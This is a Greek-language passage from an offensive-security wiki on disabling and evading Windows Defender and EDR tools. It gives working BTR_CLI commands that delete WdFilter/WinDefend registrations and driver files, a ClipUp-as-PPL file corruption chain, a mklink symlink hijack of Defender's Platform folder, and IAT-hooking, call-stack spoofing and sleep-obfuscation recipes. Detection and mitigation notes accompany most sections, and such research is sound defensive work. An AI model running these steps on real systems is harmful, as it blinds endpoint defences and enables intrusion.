Κανονικά, το Defender αποθηκεύει τον πόρο ως αρχείο `[a-z]{8}.sys` με τυχαίο όνομα και καταχωρίζει μια υπηρεσία kernel με παρόμοιο όνομα. Το `DriverEntry` διαβάζει την τιμή `Args` της υπηρεσίας, ανοίγει το αναφερόμενο NTFS ADS, αποκρυπτογραφεί και επικυρώνει τη λίστα ενεργειών, γράφει τα αποτελέσματα και επιστρέφει `0xC0000056` (`STATUS_DELETE_PENDING`) μετά την επιτυχή εκτέλεση, ώστε το πρόγραμμα οδήγησης να αποφορτωθεί αντί να παραμείνει ενεργό. Μια πλαστογραφημένη υπηρεσία έχει τις ακόλουθες χαρακτηριστικές τιμές.<sup>[[36]](#references)[[37]](#references)</sup>

```text
Type         = 1
Start        = 1
ErrorControl = 0
ImagePath    = \??\C:\Windows\System32\drivers\<random>.sys
Group        = Boot Bus Extender
Args         = C:\Windows\System32\drivers\<random>.sys:changelist
```

Το stream `:changelist` περιέχει ένα blob κρυπτογραφημένο με RC4. Τα builds που αναλύθηκαν επαναχρησιμοποιούν ένα σταθερό κλειδί 256 byte, επομένως η κρυπτογράφηση δεν αποτελεί όριο εξουσιοδότησης. Ένα έγκυρο plaintext έχει μια καθολική κεφαλίδα 24 byte (`Magic=0xFEE1DEAD`, `Version=2`, `PayloadOffset=0x10`, CRC κεφαλίδας και transaction ID που προκύπτει από το payload), ακολουθούμενη από μια διαδρομή feedback σε UTF-16 με μηδενικό τερματιστή και οποιονδήποτε αριθμό στοιχείων. Κάθε στοιχείο έχει κεφαλίδα 16 byte (`DataSize`, `Action`, `HeaderCRC`, `DataCRC`) και δεδομένα ειδικά για την ενέργεια, που τελειώνουν με **ακριβώς τέσσερα byte NUL**. Κάθε περιοχή κεφαλίδας/δεδομένων ελέγχεται ανεξάρτητα με CRC-32 πολυωνύμου `0xEDB88320`, αρχική κατάσταση `0xFFFFFFFF` και **χωρίς τελικό XOR** (`~CRC32`)· η κατάσταση CRC επαναφέρεται για κάθε περιοχή.<sup>[[36]](#references)[[37]](#references)</sup>

Τα αποδεκτά ID ενεργειών αποκαλύπτουν αυτές τις primitives του kernel.<sup>[[36]](#references)[[37]](#references)</sup>

| ID | Δεδομένα στοιχείου | Αποτέλεσμα |
| --- | --- | --- |
| 1 | `[UTF-16 path]` | Διαγραφή αρχείου, συμπεριλαμβανομένου κλειδωμένου αρχείου |
| 2 | `[UTF-16 path]` | Αφαίρεση κενού καταλόγου |
| 3 | `[Flags][source][destination]` | Μετακίνηση αρχείου σε προστατευμένη διαδρομή που επιλέγει ο attacker· κενός προορισμός σημαίνει διαγραφή |
| 4 | `[Flags][key path]` | Αναδρομική διαγραφή κλειδιού μητρώου |
| 5 | `[Flags][key path + "\\" + value]` | Διαγραφή τιμής μητρώου |
| 6 | `[Flags][type][size][key path + "\\" + value][data]` | Δημιουργία/ενημέρωση τιμής μητρώου και δημιουργία διαδρομών κλειδιών που λείπουν |

Για τις ενέργειες 5 και 6, ο διαχωριστής κλειδιού/τιμής στο wire είναι **δύο διαδοχικές ανάστροφες κάθετοι**· μια διαδρομή με τη συμβατική μορφοποίηση δεν θα διαχωριστεί σωστά. Το αρχείο feedback αντικατοπτρίζει σε μεγάλο βαθμό το αίτημα, αλλά τα πρώτα τέσσερα byte δεδομένων κάθε στοιχείου γίνονται το `NTSTATUS` που προκύπτει. Για τις ενέργειες 1 και 2, οι οποίες δεν έχουν πεδίο flags στην αρχή, το BTR μετακινεί τη διαδρομή στα τέσσερα δεσμευμένα τελικά byte, ώστε να δημιουργήσει χώρο για αυτή την κατάσταση.<sup>[[36]](#references)</sup>

### Ροή εργασίας `BTR_CLI` και παράθυρο πρώιμης εκκίνησης

Το [`BTR_CLI`](https://github.com/Dump-GUY/BTR_CLI) υλοποιεί ολόκληρη την αλυσίδα: εξαγωγή του `BTR.sys` από το τοπικό Defender, δημιουργία των `<random>.sys:changelist` και ενός stream feedback, σειριοποίηση/υπολογισμό checksums/κρυπτογράφηση αλυσιδωτών ενεργειών, απευθείας δημιουργία του κλειδιού μητρώου της υπηρεσίας και, στη συνέχεια, κλήση του `NtLoadDriver` για το `-trigger now` ή διατήρηση του ως driver εκκίνησης συστήματος για το `-trigger boot`. Η απευθείας καταχώριση στο μητρώο παρακάμπτει τη συνήθη διαδρομή `CreateServiceW` του SCM και, επομένως, **δεν** παράγει το Event ID 7045 εγκατάστασης υπηρεσίας. Τα artifacts που ενεργοποιούνται κατά την εκκίνηση μπορούν αργότερα να αφαιρεθούν με το `BTR_CLI.exe -cleanup <service_name>`.<sup>[[36]](#references)[[37]](#references)</sup>

```powershell
# Runtime: remove protected security-service registrations from Ring 0
BTR_CLI.exe -chain -item "4|HKLM\SYSTEM\CurrentControlSet\Services\WdFilter" -item "4|HKLM\SYSTEM\CurrentControlSet\Services\WinDefend" -trigger now

# Boot: delete a security driver before its user-mode protection stack starts
BTR_CLI.exe -a 1 -s "C:\Windows\System32\drivers\wd\WdFilter.sys" -trigger boot
```

`Start=0` δεν είναι αξιοποιήσιμο, επειδή το BTR εκτελεί I/O αρχείων από το `DriverEntry` πριν να είναι έτοιμα το storage stack και ο σύνδεσμος `SystemRoot`. Το `Start=1` μαζί με την ομάδα υψηλής προτεραιότητας `Boot Bus Extender` εκτελείται αντίθετα στη Φάση 1: το NTFS είναι διαθέσιμο, αλλά πολλά security drivers που ξεκινούν από το σύστημα και υπηρεσίες EDR σε user mode δεν έχουν αρχικοποιηθεί. Φίλτρα που ξεκινούν κατά την εκκίνηση, όπως το `WdFilter`, μπορεί να έχουν ήδη φορτωθεί, ωστόσο το BTR μπορεί να αφαιρέσει τα binaries τους ή τη διαμόρφωση των υπηρεσιών πριν από την επόμενη εκκίνηση, καθώς και να διαγράψει τα εκτελέσιμα των υπηρεσιών πριν τα εκκινήσει το SCM. Το ELAM δεν καλύπτει αυτό το κενό, επειδή το BTR εκτελείται μετά την αξιολόγηση των boot-start drivers και φέρει έγκυρη υπογραφή της Microsoft.<sup>[[36]](#references)</sup>

Πολλές ενέργειες εκτελούνται σε μία συναλλαγή. Το PoC προσθέτει ως πρώτο το Action 1 για το hard-coded `\SystemRoot\Temp\BootClean.log`: το BTR δημιουργεί αυτό το log, έπειτα εκτελεί το δικό του αίτημα διαγραφής και το αφαιρεί πριν από την αποφόρτωση. Αυτό μειώνει τα ίχνη, ενώ η τοποθέτηση των feedback δεδομένων στο `<random>.sys:<random>.dat` επιτρέπει την ταυτόχρονη αφαίρεση του driver και των δύο streams.<sup>[[36]](#references)[[37]](#references)</sup>

### Συσχετίσεις ανίχνευσης με υψηλό σήμα

Οι κανόνες που βασίζονται μόνο σε υπογραφές και η λίστα αποκλεισμού ευάλωτων drivers της Microsoft δεν αντιμετωπίζουν την κατάχρηση της προβλεπόμενης λειτουργικότητας του BTR. Προτιμήστε αυτές τις συσχετίσεις συμπεριφοράς, διακρίνοντας παράλληλα τη νόμιμη προέλευση από το Defender από έναν αυθαίρετο launcher.<sup>[[36]](#references)</sup>

- **Sysmon 15:** Η δημιουργία του `.sys:changelist` είναι καθολική για το staging του BTR. Ένα ADS `.dat` συνδεδεμένο με το ίδιο `.sys` είναι ιδιαίτερα ύποπτο, επειδή το Defender συνήθως τοποθετεί τα feedback δεδομένα κάτω από το `C:\ProgramData\Microsoft\Windows Defender\Scans\RebootActions\`.
- **Sysmon 12/13 χωρίς System 7045:** συσχετίστε την άμεση δημιουργία του `HKLM\SYSTEM\CurrentControlSet\Services\<random>` που περιέχει `Args=...:changelist` και `Group=Boot Bus Extender` με την απουσία αντίστοιχου συμβάντος εγκατάστασης SCM.
- **Sysmon 6 -> 23:** συσχετίστε τη φόρτωση γνωστού BTR driver από μη-Defender lineage με επακόλουθη διαγραφή αρχείων από το `System`/PID 4, ιδιαίτερα όταν πρόκειται για security binaries.
- **Sysmon 11 -> 23:** δημιουργήστε alert για την ταχεία δημιουργία και διαγραφή του `\SystemRoot\Temp\BootClean.log` από το `System`/PID 4.
- Περιορίστε και ελέγξτε την εκχώρηση/ενεργοποίηση του `SeLoadDriverPrivilege`· μια υπογραφή της Microsoft από μόνη της δεν αρκεί για εμπιστοσύνη όταν ένας driver εργαλείου ασφαλείας γίνεται staging από `cmd.exe`, PowerShell ή άγνωστη διεργασία.

## Κατάχρηση του Protected Process Light (PPL) για αλλοίωση AV/EDR με LOLBINs

Το Protected Process Light (PPL) επιβάλλει μια ιεραρχία signer/level, ώστε μόνο προστατευμένες διεργασίες ίδιου ή υψηλότερου επιπέδου να μπορούν να αλλοιώνουν η μία την άλλη. Για επιθετική χρήση, αν μπορείτε να εκκινήσετε νόμιμα ένα binary με ενεργοποιημένο PPL και να ελέγξετε τα ορίσματά του, μπορείτε να μετατρέψετε καλοήθη λειτουργικότητα (π.χ. logging) σε περιορισμένο primitive εγγραφής, υποστηριζόμενο από PPL, για προστατευμένους καταλόγους που χρησιμοποιούνται από AV/EDR.<sup>[[16]](#references)[[17]](#references)[[18]](#references)[[19]](#references)[[20]](#references)</sup>

Τι κάνει μια διεργασία να εκτελείται ως PPL
- Το EXE-στόχος (και τυχόν φορτωμένα DLL) πρέπει να έχουν υπογραφή με EKU συμβατό με PPL.
- Η διεργασία πρέπει να δημιουργηθεί με `CreateProcess`, χρησιμοποιώντας τα flags: `EXTENDED_STARTUPINFO_PRESENT | CREATE_PROTECTED_PROCESS`.
- Πρέπει να ζητηθεί συμβατό επίπεδο προστασίας που να ταιριάζει με τον signer του binary (π.χ. `PROTECTION_LEVEL_ANTIMALWARE_LIGHT` για anti-malware signers, `PROTECTION_LEVEL_WINDOWS` για Windows signers). Εσφαλμένα επίπεδα θα αποτύχουν κατά τη δημιουργία.

Δείτε επίσης μια ευρύτερη εισαγωγή στα PP/PPL και την προστασία του LSASS εδώ:

{{#ref}}
stealing-credentials/credentials-protections.md
{{#endref}}

Εργαλεία launcher
- Βοηθητικό εργαλείο open-source: CreateProcessAsPPL (επιλέγει το επίπεδο προστασίας και προωθεί τα ορίσματα στο EXE-στόχο):
  - [https://github.com/2x7EQ13/CreateProcessAsPPL](https://github.com/2x7EQ13/CreateProcessAsPPL)<sup>[[19]](#references)</sup>
- Μοτίβο χρήσης:

```text
CreateProcessAsPPL.exe <level 0..4> <path-to-ppl-capable-exe> [args...]
# example: spawn a Windows-signed component at PPL level 1 (Windows)
CreateProcessAsPPL.exe 1 C:\Windows\System32\ClipUp.exe <args>
# example: spawn an anti-malware signed component at level 3
CreateProcessAsPPL.exe 3 <anti-malware-signed-exe> <args>
```

LOLBIN primitive: ClipUp.exe
- Το υπογεγραμμένο system binary `C:\Windows\System32\ClipUp.exe` εκκινεί μια νέα διεργασία του εαυτού του και δέχεται παράμετρο για εγγραφή αρχείου καταγραφής σε διαδρομή που ορίζει ο caller.
- Όταν εκκινείται ως διεργασία PPL, η εγγραφή του αρχείου γίνεται με προστασία PPL.
- Το ClipUp δεν μπορεί να αναλύσει διαδρομές που περιέχουν κενά· χρησιμοποιήστε σύντομες διαδρομές 8.3 για να δείξετε σε τοποθεσίες που συνήθως προστατεύονται.

Βοηθητικά εργαλεία για σύντομες διαδρομές 8.3
- Εμφάνιση σύντομων ονομάτων: `dir /x` σε κάθε γονικό κατάλογο.
- Εύρεση σύντομης διαδρομής στο cmd: `for %A in ("C:\ProgramData\Microsoft\Windows Defender\Platform") do @echo %~sA`

Αλυσίδα κατάχρησης (σε αφηρημένο επίπεδο)
1) Εκκινήστε το PPL-capable LOLBIN (ClipUp) με `CREATE_PROTECTED_PROCESS` χρησιμοποιώντας έναν launcher (π.χ. CreateProcessAsPPL).
2) Δώστε το όρισμα διαδρομής καταγραφής του ClipUp για να εξαναγκάσετε τη δημιουργία αρχείου σε προστατευμένο κατάλογο AV (π.χ. Defender Platform). Χρησιμοποιήστε σύντομα ονόματα 8.3, αν χρειάζεται.
3) Αν το AV έχει συνήθως ανοιχτό/κλειδωμένο το αρχείο-στόχο όσο εκτελείται (π.χ. MsMpEng.exe), προγραμματίστε την εγγραφή κατά την εκκίνηση, πριν ξεκινήσει το AV, εγκαθιστώντας μια υπηρεσία αυτόματης εκκίνησης που εκτελείται αξιόπιστα νωρίτερα. Επαληθεύστε τη σειρά εκκίνησης με το Process Monitor (boot logging).
4) Κατά την επανεκκίνηση, η εγγραφή με προστασία PPL γίνεται πριν το AV κλειδώσει τα αρχεία του, καταστρέφοντας το αρχείο-στόχο και εμποδίζοντας την εκκίνηση.

Παράδειγμα κλήσης (οι διαδρομές έχουν αποκρυφτεί/συντομευτεί για λόγους ασφαλείας):

```text
# Run ClipUp as PPL at Windows signer level (1) and point its log to a protected folder using 8.3 names
CreateProcessAsPPL.exe 1 C:\Windows\System32\ClipUp.exe -ppl C:\PROGRA~3\MICROS~1\WINDOW~1\Platform\<ver>\samplew.dll
```

Σημειώσεις και περιορισμοί
- Δεν μπορείτε να ελέγξετε τα περιεχόμενα που γράφει το ClipUp, παρά μόνο τη θέση τους· το primitive είναι κατάλληλο για αλλοίωση και όχι για ακριβή εισαγωγή περιεχομένου.
- Απαιτούνται τοπικά δικαιώματα admin/SYSTEM για την εγκατάσταση/εκκίνηση μιας υπηρεσίας και ένα χρονικό παράθυρο για επανεκκίνηση.
- Ο χρονισμός είναι κρίσιμος: ο στόχος δεν πρέπει να είναι ανοιχτός· η εκτέλεση κατά την εκκίνηση αποφεύγει τα κλειδώματα αρχείων.

Ανιχνεύσεις
- Δημιουργία διεργασίας `ClipUp.exe` με ασυνήθιστα ορίσματα, ιδίως όταν η γονική διεργασία είναι μη τυπικός launcher και αυτό συμβαίνει κοντά στην εκκίνηση.
- Νέες υπηρεσίες ρυθμισμένες να εκκινούν αυτόματα ύποπτα binaries και να ξεκινούν συστηματικά πριν από το Defender/AV. Ερευνήστε τη δημιουργία/τροποποίηση υπηρεσιών πριν από αποτυχίες εκκίνησης του Defender.
- Παρακολούθηση ακεραιότητας αρχείων για τα binaries/τους καταλόγους Platform του Defender· μη αναμενόμενες δημιουργίες/τροποποιήσεις αρχείων από διεργασίες με σημαίες protected-process.
- Τηλεμετρία ETW/EDR: αναζητήστε διεργασίες που δημιουργούνται με `CREATE_PROTECTED_PROCESS` και μη φυσιολογική χρήση επιπέδων PPL από binaries που δεν σχετίζονται με AV.

Μετριασμοί
- WDAC/Code Integrity: περιορίστε ποια υπογεγραμμένα binaries μπορούν να εκτελούνται ως PPL και από ποιες γονικές διεργασίες· αποκλείστε την εκτέλεση του ClipUp εκτός νόμιμων πλαισίων.
- Υγιεινή υπηρεσιών: περιορίστε τη δημιουργία/τροποποίηση υπηρεσιών αυτόματης εκκίνησης και παρακολουθείτε τη χειραγώγηση της σειράς εκκίνησης.
- Βεβαιωθείτε ότι είναι ενεργοποιημένα η προστασία από παραποίηση του Defender και οι προστασίες early-launch· διερευνήστε σφάλματα εκκίνησης που υποδεικνύουν αλλοίωση binaries.
- Εξετάστε το ενδεχόμενο απενεργοποίησης της δημιουργίας σύντομων ονομάτων 8.3 σε τόμους που φιλοξενούν εργαλεία ασφαλείας, εφόσον είναι συμβατό με το περιβάλλον σας (δοκιμάστε το διεξοδικά).

## Παραποίηση του Microsoft Defender μέσω Platform Version Folder Symlink Hijack

Το Windows Defender επιλέγει την πλατφόρμα από την οποία εκτελείται απαριθμώντας τους υποφακέλους στο:
- `C:\ProgramData\Microsoft\Windows Defender\Platform\`

Επιλέγει τον υποφάκελο με τη μεγαλύτερη λεξικογραφικά συμβολοσειρά έκδοσης (π.χ., `4.18.25070.5-0`) και έπειτα ξεκινά τις διεργασίες υπηρεσίας του Defender από εκεί (ενημερώνοντας ανάλογα τις διαδρομές της υπηρεσίας/του μητρώου). Αυτή η επιλογή εμπιστεύεται τις εγγραφές καταλόγου, συμπεριλαμβανομένων των directory reparse points (symlinks). Ένας διαχειριστής μπορεί να το εκμεταλλευτεί για να ανακατευθύνει το Defender σε διαδρομή εγγράψιμη από τον επιτιθέμενο και να επιτύχει DLL sideloading ή διακοπή λειτουργίας της υπηρεσίας.<sup>[[21]](#references)[[22]](#references)</sup>

Προϋποθέσεις
- Τοπικός Administrator (απαιτείται για τη δημιουργία καταλόγων/symlinks μέσα στον φάκελο Platform)
- Δυνατότητα επανεκκίνησης ή ενεργοποίησης νέας επιλογής πλατφόρμας από το Defender (επανεκκίνηση υπηρεσίας κατά την εκκίνηση)
- Απαιτούνται μόνο ενσωματωμένα εργαλεία (mklink)

Γιατί λειτουργεί
- Το Defender αποκλείει τις εγγραφές στους δικούς του φακέλους, αλλά η επιλογή πλατφόρμας του εμπιστεύεται τις εγγραφές καταλόγου και επιλέγει τη λεξικογραφικά μεγαλύτερη έκδοση χωρίς να επικυρώνει αν ο προορισμός αντιστοιχεί σε προστατευμένη/έμπιστη διαδρομή.

Βήμα προς βήμα (παράδειγμα)
1) Προετοιμάστε ένα εγγράψιμο αντίγραφο του τρέχοντος φακέλου πλατφόρμας, π.χ. `C:\TMP\AV`:
```cmd
set SRC="C:\ProgramData\Microsoft\Windows Defender\Platform\4.18.25070.5-0"
set DST="C:\TMP\AV"
robocopy %SRC% %DST% /MIR
```
2) Δημιουργήστε μέσα στο Platform ένα symlink καταλόγου με υψηλότερη έκδοση που να δείχνει στον φάκελό σας:
```cmd
mklink /D "C:\ProgramData\Microsoft\Windows Defender\Platform\5.18.25070.5-0" "C:\TMP\AV"
```
3) Επιλογή trigger (συνιστάται επανεκκίνηση):
```cmd
shutdown /r /t 0
```
4) Επαληθεύστε ότι το MsMpEng.exe (WinDefend) εκτελείται από την ανακατευθυνόμενη διαδρομή:
```powershell
Get-Process MsMpEng | Select-Object Id,Path
# or
wmic process where name='MsMpEng.exe' get ProcessId,ExecutablePath
```
Θα πρέπει να παρατηρήσετε τη νέα διαδρομή της διεργασίας κάτω από το `C:\TMP\AV\` και τη διαμόρφωση υπηρεσίας/registry που αναφέρεται σε αυτήν τη θέση.

Επιλογές post-exploitation
- DLL sideloading/code execution: Τοποθετήστε/αντικαταστήστε DLL που φορτώνει το Defender από τον κατάλογο της εφαρμογής του, για να εκτελέσετε κώδικα στις διεργασίες του Defender. Δείτε την παραπάνω ενότητα: [DLL Sideloading & Proxying](#dll-sideloading--proxying).
- Τερματισμός υπηρεσίας/άρνηση υπηρεσίας: Αφαιρέστε το version-symlink, ώστε στην επόμενη εκκίνηση η διαμορφωμένη διαδρομή να μην επιλύεται και το Defender να αποτυγχάνει να εκκινηθεί:
```cmd
rmdir "C:\ProgramData\Microsoft\Windows Defender\Platform\5.18.25070.5-0"
```

> [!TIP]
> Σημειώστε ότι αυτή η τεχνική δεν παρέχει από μόνη της privilege escalation· απαιτεί δικαιώματα admin.

## API/IAT Hooking + Call-Stack Spoofing with PIC (Crystal Kit-style)

Οι ομάδες red team μπορούν να μεταφέρουν το runtime evasion από το C2 implant στο ίδιο το target module, κάνοντας hooking στο Import Address Table (IAT) του και δρομολογώντας επιλεγμένα API μέσω attacker-controlled, position‑independent code (PIC). Έτσι, το evasion επεκτείνεται πέρα από το περιορισμένο σύνολο API που εκθέτουν πολλά kits (π.χ. CreateProcessA) και οι ίδιες προστασίες εφαρμόζονται επίσης σε BOFs και post‑exploitation DLLs.<sup>[[3]](#references)[[4]](#references)[[5]](#references)</sup>

Προσέγγιση υψηλού επιπέδου
- Τοποθετήστε ένα PIC blob δίπλα στο target module χρησιμοποιώντας reflective loader (prepended ή companion). Το PIC πρέπει να είναι self‑contained και position‑independent.
- Κατά τη φόρτωση του host DLL, διατρέξτε το IMAGE_IMPORT_DESCRIPTOR και τροποποιήστε τις εγγραφές IAT των στοχευμένων imports (π.χ. CreateProcessA/W, CreateThread, LoadLibraryA/W, VirtualAlloc), ώστε να δείχνουν σε λεπτά PIC wrappers.
- Κάθε PIC wrapper εκτελεί evasions πριν κάνει tail‑call στη διεύθυνση του πραγματικού API. Συνήθεις evasions περιλαμβάνουν:
  - Memory mask/unmask γύρω από την κλήση (π.χ. κρυπτογράφηση περιοχών beacon, RWX→RX, αλλαγή ονομάτων/δικαιωμάτων σελίδων) και επαναφορά μετά την κλήση.
  - Call‑stack spoofing: κατασκευάστε ένα benign stack και μεταβείτε στο target API, ώστε η ανάλυση call stack να επιλύεται στα αναμενόμενα frames.<sup>[[9]](#references)</sup>
- Για συμβατότητα, εξαγάγετε ένα interface, ώστε ένα Aggressor script (ή ισοδύναμο) να μπορεί να καταχωρίζει ποια API θα γίνεται hook για Beacon, BOFs και post‑ex DLLs.

Γιατί IAT hooking εδώ
- Λειτουργεί για οποιονδήποτε κώδικα χρησιμοποιεί το API που έχει γίνει hook, χωρίς να τροποποιείται ο κώδικας του εργαλείου ή να βασίζεται στο Beacon για να κάνει proxy συγκεκριμένων API.
- Καλύπτει post‑ex DLLs: το hooking στα LoadLibrary* σάς επιτρέπει να παρεμβάλλεστε στις φορτώσεις modules (π.χ. System.Management.Automation.dll, clr.dll) και να εφαρμόζετε το ίδιο masking/stack evasion στις κλήσεις API τους.
- Επαναφέρει την αξιόπιστη χρήση post‑ex εντολών που δημιουργούν διεργασίες, απέναντι σε detections που βασίζονται στο call stack, κάνοντας wrapping τα CreateProcessA/W.

Ελάχιστο σκαρίφημα IAT hook (ψευδοκώδικας x64 C/C++)
```c
// For each IMAGE_IMPORT_DESCRIPTOR
//  For each thunk in the IAT
//    if imported function == "CreateProcessA"
//       WriteProcessMemory(local): IAT[idx] = (ULONG_PTR)Pic_CreateProcessA_Wrapper;
// Wrapper performs: mask(); stack_spoof_call(real_CreateProcessA, args...); unmask();
```
Σημειώσεις
- Εφαρμόστε το patch μετά τις relocations/ASLR και πριν από την πρώτη χρήση του import. Reflective loaders όπως οι TitanLdr/AceLdr δείχνουν πώς γίνεται hooking κατά το DllMain του φορτωμένου module.
- Κρατήστε τα wrappers μικρά και ασφαλή για PIC· επιλύστε το πραγματικό API μέσω της αρχικής τιμής IAT που αποθηκεύσατε πριν από το patching ή μέσω του LdrGetProcedureAddress.
- Χρησιμοποιήστε μεταβάσεις RW → RX για PIC και αποφύγετε σελίδες με ταυτόχρονα δικαιώματα εγγραφής και εκτέλεσης.

Stub πλαστογράφησης call stack
- Τα PIC stubs τύπου Draugr δημιουργούν μια ψεύτικη αλυσίδα κλήσεων (return addresses μέσα σε benign modules) και στη συνέχεια κάνουν pivot προς το πραγματικό API.
- Αυτό παρακάμπτει detections που περιμένουν κανονικά stacks από Beacon/BOFs προς ευαίσθητα APIs.
- Συνδυάστε το με τεχνικές stack cutting/stack stitching, ώστε η εκτέλεση να φτάνει μέσα στα αναμενόμενα frames πριν από το prologue του API.

Επιχειρησιακή ενσωμάτωση
- Προσθέστε τον reflective loader πριν από τα post-ex DLLs, ώστε το PIC και τα hooks να αρχικοποιούνται αυτόματα κατά τη φόρτωση του DLL.
- Χρησιμοποιήστε ένα Aggressor script για να καταχωρίσετε τα target APIs, ώστε τα Beacon και BOFs να επωφελούνται διαφανώς από την ίδια διαδρομή evasion χωρίς αλλαγές στον κώδικα.

Σκέψεις για Detection/DFIR
- Ακεραιότητα IAT: entries που επιλύονται σε διευθύνσεις εκτός image (heap/anon)· περιοδική επαλήθευση των import pointers.
- Ανωμαλίες stack: return addresses που δεν ανήκουν σε φορτωμένα images· απότομες μεταβάσεις σε PIC εκτός image· ασυνεπής προέλευση RtlUserThreadStart.
- Τηλεμετρία loader: εγγραφές στο IAT εντός της διεργασίας, δραστηριότητα DllMain νωρίς κατά τη φόρτωση που τροποποιεί import thunks, μη αναμενόμενες περιοχές RX που δημιουργούνται κατά τη φόρτωση.
- Παράκαμψη image-load: αν κάνετε hooking στα LoadLibrary*, παρακολουθήστε ύποπτες φορτώσεις automation/clr assemblies που συσχετίζονται με συμβάντα masking μνήμης.

Σχετικά δομικά στοιχεία και παραδείγματα
- Reflective loaders που κάνουν IAT patching κατά τη φόρτωση (π.χ., TitanLdr, AceLdr)
- Hooks για memory masking (π.χ., simplehook) και PIC για stack-cutting (stackcutting)
- PIC stubs για πλαστογράφηση call stack (π.χ., Draugr)


## IAT Hooking κατά τον χρόνο εισαγωγής + Sleep Obfuscation (Crystal Palace/PICO)

### IAT hooks κατά τον χρόνο εισαγωγής μέσω resident PICO

Αν ελέγχετε έναν reflective loader, μπορείτε να κάνετε hooking στα imports **κατά τη διάρκεια** του `ProcessImports()`, αντικαθιστώντας τον δείκτη `GetProcAddress` του loader με έναν custom resolver που ελέγχει πρώτα τα hooks:<sup>[[6]](#references)[[7]](#references)[[8]](#references)</sup>

- Δημιουργήστε ένα **resident PICO** (persistent PIC object) που παραμένει ενεργό αφότου απελευθερωθεί το transient loader PIC.
- Εξαγάγετε μια συνάρτηση `setup_hooks()` που αντικαθιστά τον import resolver του loader (π.χ., `funcs.GetProcAddress = _GetProcAddress`).
- Στο `_GetProcAddress`, παραλείψτε τα ordinal imports και χρησιμοποιήστε μια hash-based αναζήτηση hooks, όπως η `__resolve_hook(ror13hash(name))`. Αν υπάρχει hook, επιστρέψτε το· διαφορετικά, καλέστε τον πραγματικό `GetProcAddress`.
- Καταχωρίστε τους στόχους των hooks κατά το link time με καταχωρίσεις Crystal Palace `addhook "MODULE$Func" "hook"`. Το hook παραμένει έγκυρο επειδή βρίσκεται μέσα στο resident PICO.

Έτσι επιτυγχάνεται **ανακατεύθυνση IAT κατά τον χρόνο εισαγωγής**, χωρίς patching στην ενότητα κώδικα του φορτωμένου DLL μετά τη φόρτωση.

### Εξαναγκασμός hookable imports όταν ο στόχος χρησιμοποιεί PEB-walking

Τα hooks κατά τον χρόνο εισαγωγής ενεργοποιούνται μόνο αν η συνάρτηση υπάρχει πράγματι στο IAT του στόχου. Αν ένα module επιλύει APIs μέσω PEB-walk + hash (χωρίς import entry), εξαναγκάστε ένα πραγματικό import, ώστε η διαδρομή `ProcessImports()` του loader να το εντοπίσει:

- Αντικαταστήστε την hashed επίλυση export (π.χ., `GetSymbolAddress(..., HASH_FUNC_WAIT_FOR_SINGLE_OBJECT)`) με μια άμεση αναφορά όπως η `&WaitForSingleObject`.
- Ο compiler δημιουργεί μια καταχώριση IAT, επιτρέποντας την παρεμβολή κατά την επίλυση των imports από τον reflective loader.

### Obfuscation ύπνου/αδράνειας τύπου Ekko χωρίς patching του `Sleep()`

Αντί να κάνετε patch στο `Sleep`, κάντε hooking στα **πραγματικά primitives αναμονής/IPC** που χρησιμοποιεί το implant (`WaitForSingleObject(Ex)`, `WaitForMultipleObjects`, `ConnectNamedPipe`). Για μεγάλες αναμονές, τυλίξτε την κλήση σε μια αλυσίδα obfuscation τύπου Ekko που κρυπτογραφεί το image στη μνήμη κατά την αδράνεια:<sup>[[31]](#references)[[27]](#references)</sup>

- Χρησιμοποιήστε το `CreateTimerQueueTimer` για να προγραμματίσετε μια ακολουθία callbacks που καλούν το `NtContinue` με κατασκευασμένα `CONTEXT` frames.
- Τυπική αλυσίδα (x64): ορίστε το image σε `PAGE_READWRITE` → κρυπτογραφήστε το με RC4 μέσω του `advapi32!SystemFunction032` σε ολόκληρο το mapped image → εκτελέστε την blocking αναμονή → αποκρυπτογραφήστε το με RC4 → **επαναφέρετε τα δικαιώματα ανά section** διατρέχοντας τα PE sections → σηματοδοτήστε την ολοκλήρωση.
- Το `RtlCaptureContext` παρέχει ένα πρότυπο `CONTEXT`· κλωνοποιήστε το σε πολλαπλά frames και ορίστε registers (`Rip/Rcx/Rdx/R8/R9`) για να εκτελεστεί κάθε βήμα.

Επιχειρησιακή λεπτομέρεια: επιστρέψτε “success” για μεγάλες αναμονές (π.χ., `WAIT_OBJECT_0`), ώστε ο caller να συνεχίσει ενώ το image είναι masked. Αυτό το μοτίβο κρύβει το module από scanners κατά τα διαστήματα αδράνειας και αποφεύγει το κλασικό signature του “patched `Sleep()`”.

Ιδέες για Detection (με βάση την τηλεμετρία)
- Ριπές callbacks `CreateTimerQueueTimer` που δείχνουν στο `NtContinue`.
- Χρήση του `advapi32!SystemFunction032` σε μεγάλα, συνεχόμενα buffers μεγέθους image.
- `VirtualProtect` σε μεγάλη περιοχή, ακολουθούμενο από προσαρμοσμένη επαναφορά δικαιωμάτων ανά section.

### Καταχώριση CFG κατά τον χρόνο εκτέλεσης για gadgets sleep-obfuscation

Σε στόχους με ενεργοποιημένο CFG, το πρώτο έμμεσο jump προς ένα mid-function gadget, όπως το `jmp [rbx]` ή το `jmp rdi`, συνήθως προκαλεί crash της διεργασίας με `STATUS_STACK_BUFFER_OVERRUN`, επειδή το gadget δεν υπάρχει στα metadata CFG του module. Για να διατηρήσετε ενεργές αλυσίδες τύπου Ekko/Kraken μέσα σε hardened διεργασίες:<sup>[[30]](#references)</sup>

- Καταχωρίστε κάθε έμμεσο προορισμό που χρησιμοποιεί η αλυσίδα μέσω του `NtSetInformationVirtualMemory(..., VmCfgCallTargetInformation, ...)` και καταχωρίσεων `CFG_CALL_TARGET_VALID`.
- Για διευθύνσεις μέσα σε φορτωμένα images (`ntdll`, `kernel32`, `advapi32`), το `MEMORY_RANGE_ENTRY` πρέπει να ξεκινά από το **image base** και να καλύπτει το **πλήρες μέγεθος του image**.
- Για περιοχές που έχουν γίνει manually mapped/PIC/stomped, χρησιμοποιήστε τη **βάση της εκχώρησης** και το μέγεθος της εκχώρησης.
- Επισημάνετε όχι μόνο το dispatch gadget, αλλά και τα exports στα οποία γίνεται έμμεση πρόσβαση (`NtContinue`, `SystemFunction032`, `VirtualProtect`, `GetThreadContext`, `SetThreadContext`, wait/event syscalls), καθώς και τυχόν εκτελέσιμα sections ελεγχόμενα από τον attacker που θα γίνουν έμμεσοι στόχοι.

